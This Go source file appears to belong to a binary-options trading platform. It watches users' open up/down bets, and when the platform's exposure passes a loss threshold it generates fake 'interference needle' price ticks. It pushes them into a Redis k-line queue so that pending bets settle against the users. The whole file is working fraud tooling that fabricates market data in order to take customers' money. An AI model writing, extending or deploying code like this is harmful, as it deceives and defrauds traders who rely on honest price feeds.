package monitoring

import (
	"encoding/json"
	"fmt"
	goRedis "github.com/go-redis/redis"
	"github.com/shopspring/decimal"
	"goapi/app/models"
	"goapi/app/response"
	"goapi/pkg/helpers"
	"goapi/pkg/logger"
	"goapi/pkg/mysql"
	"goapi/pkg/redis"
	"goapi/service/binary-monitoring/config"
	"math/rand"
	"strings"
	"time"
)

// 监控

func Start() {
	// 1、查询需要插针的资产
	var list []response.TradingAssetsMonitoring
	mysql.DB.
		Model(models.TradingAssets{}).
		Where("is_valid", 1).
		Where("is_monitoring", 1).
		Find(&list)
	for _, item := range list {
		currentTimeMillis := time.Now().UnixMilli()
		if 60-item.InadvanceTimer <= 0 {
			// 设置提前触发时间,如果设置不合理，就跳过，同时打印日志，或者发送通知
			logger.Info(currentTimeMillis, "设置提前触发时间不合理")
			continue
		}
		if 60-item.EarlyexecutionTimer <= 10 {
			// 提前执行时间不合理
			logger.Info(currentTimeMillis, "提前执行时间设置不合理，建议10~45之间")
			continue
		}
		if item.ShockAmplitude == 0 {
			// 未配置震荡幅度
			logger.Info(currentTimeMillis, "未配置震荡幅度")
			continue
		}
		if item.VolatilityFrequency == 0 {
			// 未配置震荡频率
			logger.Info(currentTimeMillis, "未配置震荡频率")
			continue
		}
		if item.VolatilityAmplitude == 0 {
			// 未配置波动幅度
			logger.Info(currentTimeMillis, "未配置波动幅度")
			continue
		}
		// 区域时长大于间隔触发时间，不执行
		if item.AreaTimer > item.IntervalTimer {
			logger.Info(currentTimeMillis, "区域时长大于间隔触发时间")
			continue
		}
		//logger.Info(currentTimeMillis, index, item.ID, "---", item.AssetsCode)
		// 1、设置提前触发时间（拿这个时间价格作为判断条件）
		//logger.Info(currentTimeMillis, item)
		var tradingOrder []response.TradingOrder
		mysql.DB.Model(models.TradingOrder{}).
			Where(models.Prefix("$_trading_order.assets_code"), item.AssetsCode).
			Where(models.Prefix("$_trading_order.quiz_result"), -1).
			Where(models.Prefix("$_trading_order.is_valid"), 1).
			Where(models.Prefix("$_trading_order.trade_begin_timestamp >= ?"), currentTimeMillis-item.InadvanceTimer*1000).
			Select(models.Prefix("$_trading_order.*,$_app_currency_rate.b_num as currency_rate")).
			Joins(models.Prefix("right join $_app_currency_rate on $_trading_order.currency_type=$_app_currency_rate.currency_b")).
			Find(&tradingOrder)
		if len(tradingOrder) > 0 {
			calculate(currentTimeMillis, item, tradingOrder)
		}
	}
}

// 进行计算分析是否需要插针，以及按照规则生成插针数据
func calculate(currentTimeMillis int64, conf response.TradingAssetsMonitoring, orders []response.TradingOrder) {
	var (
		// 买涨的人数
		upNum int64 = 0
		// 买涨的金额
		upAmounts float64 = 0.00
		// 买跌的人数
		downNum int64 = 0
		// 买跌的金额
		downAmounts float64 = 0.00
		// HClose 最大 close
		HClose float64 = 0.00
		// LClose 最小 close
		LClose   float64 = 100000000.00
		winLoss  float64 = 0.00
		WinType  string  = ""
		Peoples  []string
		OrderIds []string
	)
	for _, order := range orders {
		Peoples = append(Peoples, order.AppUserID)
		OrderIds = append(OrderIds, order.TradeOrderID)
		// 最大close
		if order.BeginAssetsPrice > HClose {
			HClose = order.BeginAssetsPrice
		}
		// 最大close
		if order.BeginAssetsPrice < LClose {
			LClose = order.BeginAssetsPrice
		}
		if strings.EqualFold("up", order.UpDownType) {
			upNum++
			// 换算美元
			upAmounts = decimal.NewFromFloat(upAmounts).Add(
				decimal.NewFromFloat(order.Amounts).Mul(decimal.NewFromFloat(order.ReturnRate)).
					Div(decimal.NewFromFloat(order.CurrencyRate)),
			).InexactFloat64()
		}
		if strings.EqualFold("down", order.UpDownType) {
			downNum++
			// 换算美元
			downAmounts = decimal.NewFromFloat(downAmounts).Add(
				decimal.NewFromFloat(order.Amounts).Mul(decimal.NewFromFloat(order.ReturnRate)).
					Div(decimal.NewFromFloat(order.CurrencyRate)),
			).InexactFloat64()
		}
	}
	// 检测是否安全期内
	ok, err := redis.Client.SelectDbSetNx(15, fmt.Sprintf("Monitoring:%s", orders[0].AssetsCode), "suo", conf.IntervalTimer)
	if err != nil {
		return
	}
	if !ok {
		return
	}
	if HClose == LClose && len(orders) > 1 {
		logger.Info("平了")
		return
	}
	mysql.DB.Model(models.TradingOrder{}).Where("")
	Peoples = helpers.RemoveRepeatedElement(Peoples)
	// 插针明细表
	var NeedleDetails models.NeedleDetails
	NeedleDetails.AssetsCode = conf.AssetsCode
	NeedleDetails.StartTimer = 0
	NeedleDetails.StartDate = time.Unix(0, NeedleDetails.StartTimer*int64(time.Millisecond))
	NeedleDetails.EndTimer = 0
	NeedleDetails.EndDate = time.Unix(0, NeedleDetails.EndTimer*int64(time.Millisecond))
	NeedleDetails.OrderNum = len(orders)
	NeedleDetails.PeopleNum = len(Peoples)
	//
	NeedleDetails.MarketQuoteOdds = 0
	NeedleDetails.MarketQuoteWinAmount = 0
	NeedleDetails.NeedleAfterOdds = 0
	NeedleDetails.NeedleAfterWinAmount = 0
	//
	NeedleDetails.CreateDate = time.Now()
	NeedleDetails.UpdateDate = time.Now()
	// 区域内用户盈利金额
	winLoss = decimal.NewFromFloat(upAmounts).Sub(decimal.NewFromFloat(downAmounts)).InexactFloat64()
	if winLoss > 0 {
		WinType = "winDown" // 低价位平台盈利
	} else if winLoss < 0 {
		winLoss = -winLoss
		WinType = "winUp" // 高价位平台盈利
	} else {
		// 盈亏平了，不用进行干预
		return
	}
	if winLoss < conf.LossThreshold {
		return
	}
	// 如果该区域平台亏损金额大于xx美金，开始进行干预
	logger.Info("最大close", HClose)
	logger.Info("最小close", LClose)
	// 低价位平台盈利
	if strings.EqualFold("winDown", WinType) {
		go CreateInterferenceNeedle(currentTimeMillis, HClose, LClose, conf)
	}
	// 高价位平台盈利
	if strings.EqualFold("winUp", WinType) {
		go CreateInterferenceNeedle(currentTimeMillis, HClose, LClose, conf)
	}

}

// 创建干扰针

func CreateInterferenceNeedle(currentTimeMillis int64, HClose, LClose float64, conf response.TradingAssetsMonitoring) {
	// 提前插针时间
	EarlyExecutionTimer := currentTimeMillis + (60-conf.EarlyexecutionTimer)*1000
	EarlyExecutionTimerEnd := currentTimeMillis + 60*1000
	RecoverTs := EarlyExecutionTimerEnd
	RecoverTimer := currentTimeMillis + (60-conf.RecoverTimer)*1000
	// 到达提前执行插针时间 ~ 区间开始时间内往 最低价格*(1-资产波动幅度)位置按设置频率次数下挫
	cClose := HClose
	diffClose := decimal.NewFromFloat(HClose).Sub(decimal.NewFromFloat(LClose)).InexactFloat64()
	for i := 0; i < conf.EarlyexecutionFrequency; i++ {
		diffClose = diffClose * decimal.NewFromFloat(1).Sub(decimal.NewFromFloat(conf.VolatilityAmplitude)).InexactFloat64()
		cClose = cClose - diffClose
		cClose, _ = helpers.FormatFloat(cClose, conf.PointNumber)
		data := redisData(conf.AssetsCode, config.KlineSource, EarlyExecutionTimer+(int64(i))*1000, cClose)
		logger.Info(data)
		if len(data) > 0 {
			_, err := redis.Client.Lpush(fmt.Sprintf("Queue:interferenceNeedle:%s", conf.AssetsCode), data)
			if err != nil {
				panic(err)
			}
		}
	}
	// 资产在最低价格~最低价格*(1-资产震荡幅度）之间按设置震荡频率随机震荡，直到区间结束时间
	cClose = LClose
	timeNow := EarlyExecutionTimer + int64(conf.EarlyexecutionFrequency)*1000
	i := 0
	for SystemTs := timeNow; SystemTs <= EarlyExecutionTimerEnd; SystemTs = SystemTs + 1000 {
		i++
		// 求余，每隔xx秒震荡一次，随机的是震荡方向
		ok := decimal.NewFromInt(int64(i)).Mod(decimal.NewFromInt(conf.VolatilityFrequency)).IsZero()
		if ok {
			// 随机震荡
			if rand.Intn(2) == 0 {
				cClose = cClose * decimal.NewFromFloat(1).Sub(decimal.NewFromFloat(conf.ShockAmplitude)).InexactFloat64()
			} else {
				cClose = cClose * decimal.NewFromFloat(1).Add(decimal.NewFromFloat(conf.ShockAmplitude)).InexactFloat64()
			}
		}
		cClose, _ = helpers.FormatFloat(cClose, conf.PointNumber)
		if cClose > LClose {
			cClose = LClose
		}
		result := cClose
		logger.Info(result)
		// 获取随机数 close 值
		data := redisData(conf.AssetsCode, config.KlineSource, SystemTs, cClose)
		logger.Info(data)
		if len(data) > 0 {
			_, err := redis.Client.Lpush(fmt.Sprintf("Queue:interferenceNeedle:%s", conf.AssetsCode), data)
			if err != nil {
				panic(err)
			}
		}
	}
	// 追加结束信号，后面好根据结束信号来生成恢复数据插针逻辑
	data := redisData(conf.AssetsCode, "End", 0, 0)
	logger.Info(data)
	if len(data) > 0 {
		_, err := redis.Client.Lpush(fmt.Sprintf("Queue:interferenceNeedle:%s", conf.AssetsCode), data)
		if err != nil {
			panic(err)
		}
	}
	redis.Client.ZAdd("Queue:interferenceNeedle:list", goRedis.Z{
		Score:  float64(EarlyExecutionTimer),
		Member: fmt.Sprintf("Queue:interferenceNeedle:%s", conf.AssetsCode),
	})
	// 频次
	logger.Info(time.Now().UnixMilli(), EarlyExecutionTimer, time.Now().UnixMilli()-EarlyExecutionTimer, RecoverTimer, RecoverTs, EarlyExecutionTimerEnd)
}

// RedisData 缓存进redis的数据
func redisData(AssetsCode, Source string, SystemTs int64, close float64) string {
	var data response.SubIndexKLineResponse
	data.Ch = fmt.Sprintf("market.%v.index.1min", AssetsCode)
	data.Ts = SystemTs                                                                             // 系統生成的Ts
	data.TsDate = time.Unix(0, SystemTs*int64(time.Millisecond)).Format("2006-01-02 15:04:05.999") // 系統生成的Ts
	data.Source = Source
	data.Tick.Id = SystemTs
	data.Tick.Vol = ""
	data.Tick.Count = 0
	data.Tick.Open = "0.00"
	data.Tick.Close = fmt.Sprintf("%v", close)
	data.Tick.Low = ""
	data.Tick.High = ""
	data.Tick.Amount = "0"
	strData, err := json.Marshal(data) //转换成JSON返回的是byte[]
	if err != nil {
		logger.Error(err)
		return ""
	}
	return string(strData)
}
